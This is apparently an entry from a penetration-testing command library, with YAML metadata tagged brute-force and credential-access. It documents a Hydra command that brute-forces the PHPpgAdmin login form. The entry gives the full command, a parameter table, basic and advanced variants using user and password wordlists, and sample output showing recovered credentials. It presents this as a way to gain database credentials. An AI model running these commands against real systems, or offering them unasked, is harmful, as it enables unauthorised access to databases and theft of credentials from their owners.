---
data: >-
  hydra -l admin -P /path/to/passwords.txt target-ip http-post-form
  "/phppgadmin/login.php:user=^USER^&pass=^PASS^:Invalid login" -t 4 -vV
tags:
  - brute-force
  - credential-access
type: command
output: null
executor: bash
platforms:
  - Linux
  - Web
id: 286db273-b714-4c02-8c6d-092077398ec8
created_at: '2025-12-14T17:24:55.732Z'
updated_at: '2025-12-14T17:24:55.732Z'
verified: false
validated: true
submitted: true
---
# hydra-bruteforce-phppgadmin

## Command

```bash
hydra -l admin -P /path/to/passwords.txt target-ip http-post-form "/phppgadmin/login.php:user=^USER^&pass=^PASS^:Invalid login" -t 4 -vV
```

## Description

This command launches a brute-force attack on the PHPpgAdmin login using Hydra, testing a single username against a password list via HTTP POST. Ideal for exploiting unrestricted access to gain database credentials.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-l admin` | Single login username (common default) | Yes |
| `-P /path/to/passwords.txt` | Password wordlist file | Yes |
| `target-ip` | Target host IP or domain | Yes |
| `http-post-form` | Module for form-based login | Yes |
| `"Invalid login"` | Failure string to detect bad attempts | Yes |
| `-t 4` | Number of parallel tasks | No |
| `-vV` | Verbose output with details | No |

## Examples

### Basic Usage

```bash
hydra -l admin -P passwords.txt 192.168.1.100 http-post-form "/phppgadmin/login.php:user=^USER^&pass=^PASS^:F" -t 4
```

### Advanced Usage

```bash
hydra -L users.txt -P passwords.txt target.com http-post-form "/phppgadmin/login.php:user=^USER^&pass=^PASS^:Invalid:F=incorrect" -t 8 -V
```

## Expected Output

Progress updates with failed attempts, ending with success like "[80][http-post-form] host: 192.168.1.100   login: admin   password: postgres" if credentials are found.

## Related

- [[Related Procedure|procedures/Brute-Force-PHPpgAdmin-for-Database-Access]]
